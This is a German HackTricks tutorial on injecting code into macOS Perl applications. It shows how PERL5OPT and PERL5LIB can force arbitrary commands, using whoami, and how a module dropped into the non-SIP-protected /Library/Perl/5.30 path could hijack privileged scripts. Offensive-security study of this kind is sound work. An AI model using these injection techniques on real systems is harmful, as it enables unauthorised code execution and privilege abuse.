# macOS Perl-Anwendungen Injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

## Über `PERL5OPT` & `PERL5LIB` Umgebungsvariable

Mit der Umgebungsvariable PERL5OPT ist es möglich, dass Perl beliebige Befehle ausführt.\
Erstellen Sie beispielsweise dieses Skript:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Jetzt **exportieren Sie die Umgebungsvariable** und führen Sie das **Perl**-Skript aus:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Eine weitere Option besteht darin, ein Perl-Modul zu erstellen (z. B. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Und verwenden Sie dann die Umgebungsvariablen:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Über Abhängigkeiten

Es ist möglich, die Reihenfolge der Abhängigkeiten im Ordner von Perl, der ausgeführt wird, aufzulisten:
```bash
perl -e 'print join("\n", @INC)'
```
Was zurückgeben wird, ist etwas Ähnliches wie:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Einige der zurückgegebenen Ordner existieren nicht einmal, jedoch existiert **`/Library/Perl/5.30`**, es ist **nicht** durch **SIP** geschützt und es befindet sich **vor** den von SIP geschützten Ordnern. Daher könnte jemand diesen Ordner missbrauchen, um Skriptabhängigkeiten hinzuzufügen, damit ein Perl-Skript mit hohen Berechtigungen es lädt.

{% hint style="warning" %}
Beachten Sie jedoch, dass Sie **Root-Rechte benötigen, um in diesen Ordner zu schreiben**, und heutzutage erhalten Sie diese **TCC-Aufforderung**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Zum Beispiel, wenn ein Skript **`use File::Basename;`** importiert, wäre es möglich, `/Library/Perl/5.30/File/Basename.pm` zu erstellen, um beliebigen Code auszuführen.

## Referenzen

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
